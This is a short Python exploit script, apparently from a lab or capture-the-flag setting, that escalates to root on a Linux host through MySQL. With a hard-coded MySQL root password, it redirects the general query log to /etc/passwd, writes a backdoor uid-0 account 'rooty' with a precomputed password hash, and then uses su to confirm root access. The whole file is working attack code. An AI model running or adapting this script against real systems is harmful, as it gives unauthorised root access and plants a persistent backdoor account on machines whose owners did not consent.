import os
from time import sleep

MYSQL_ROOT_PASSWORD="yeet"

# echo -n 'password' | mkpasswd -s -S '00' -R 1 -m des
# 00xQPHYlVDIw6
USERNAME = 'rooty'
PASSWORD = 'password'

print('Exploit started with these creds:')
os.system('id')
print()

print('Exploiting...')
with open('/tmp/payload.sql', 'x') as fh:
    fh.write("""set global general_log_file ='/etc/passwd';
set global general_log=on;
select '

rooty:00xQPHYlVDIw6:0:0::/root:/bin/bash

';
set global general_log=off;""")
os.system(f'mysql -uroot -p{MYSQL_ROOT_PASSWORD} < /tmp/payload.sql')

print('\nTrying to login as root...')
os.system(f"echo '{PASSWORD}' | su - -c 'echo;echo;id;echo;' {USERNAME}")

print('\nDone')